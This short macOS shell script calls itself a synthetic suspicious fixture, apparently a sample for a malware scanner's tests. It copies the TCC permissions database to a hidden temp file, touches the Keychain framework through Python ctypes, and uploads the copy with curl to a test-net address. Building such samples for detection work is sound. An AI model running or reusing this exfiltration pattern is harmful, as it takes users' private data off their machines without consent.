#!/bin/sh
# Synthetic suspicious fixture: reaches into the TCC permissions database and
# Keychain Services, then exfiltrates a copy to a test-net address — the
# "harvest local secrets, phone home" shape, distinct from the loader
# droppers alongside it.
cp ~/Library/Application\ Support/com.apple.TCC/TCC.db /tmp/.tcc_copy 2>/dev/null

python3 - <<'EOF'
import ctypes
sec = ctypes.CDLL("/System/Library/Frameworks/Security.framework/Security")
sec.SecKeychainCopyDefault
EOF

curl -fsSL -X POST --data-binary @/tmp/.tcc_copy http://198.51.100.99/collect >/dev/null 2>&1
